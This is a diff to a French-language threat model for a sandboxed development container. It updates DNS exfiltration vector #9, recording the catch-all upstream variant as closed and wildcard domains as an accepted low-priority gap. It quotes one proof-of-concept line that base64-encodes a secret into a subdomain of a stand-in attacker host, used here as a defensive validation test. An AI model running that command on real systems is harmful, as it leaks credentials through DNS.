@@ -152,10 +152,20 @@ Vecteurs **hors scope critères** (#5, #6, #7, #11) restent acceptés. Si
 node-level persistence devient une préoccupation, sessions 3+5 sont les
 remédiations.
 
-Vecteur #9 (DNS exfil via wildcard) reste un **gap P3 accepté** :
-restreindre les wildcards casserait des workflows légitimes (registry
-npm via `*.githubusercontent.com`, telemetry `*.statsig.com`). Volume
-d'exfil limité par le subdomain length cap (~63 char/label).
+Vecteur #9 (DNS exfil) — 2 variantes distinguées :
+
+- **Catch-all upstream** (`server=127.0.0.11` dans `dnsmasq.conf`) :
+  **CLOSED** par rollout v2 (devcontainer-security-hardening-v2 session
+  3, 2026-05-22). Le default upstream est droppé → dnsmasq retourne
+  `status: REFUSED` sur unlisted → la query ne leak plus via Docker DNS
+  → host DNS → public DNS. PoC #9 (`dig $(base64 secret).attacker.com
+  @127.0.0.53`) validé REFUSED en session 4 (gate).
+- **Wildcards** (`*.statsig.com` / `*.githubusercontent.com` etc.) :
+  reste un **gap P3 accepté** — restreindre les wildcards casserait des
+  workflows légitimes (registry npm, telemetry). Volume d'exfil limité
+  par le subdomain length cap (~63 char/label). v2 ROLLOUT decision
+  « no wildcard parent promotion » : pas de nouveau `*.parent.com`
+  introduit, les wildcards existants restent opt-in vendor-trusted.
 
 Vecteur #10 (`firewall-blocks` runtime) à confirmer en session 6 — si
 non-runtime-callable, marquer ⚪ accepted.
@@ -169,4 +179,5 @@ Aucun vecteur ne viole les 3 critères. `node` ne peut :
 
 Surfaces optionnelles restantes (defense-in-depth, hors scope critères) :
 hooks Claude (#5), lifecycle scripts (#6, #7), mitm logs (#11), wildcard
-DNS (#9).
+DNS (#9 variante wildcards — la variante catch-all est CLOSED par v2,
+cf. plus haut).
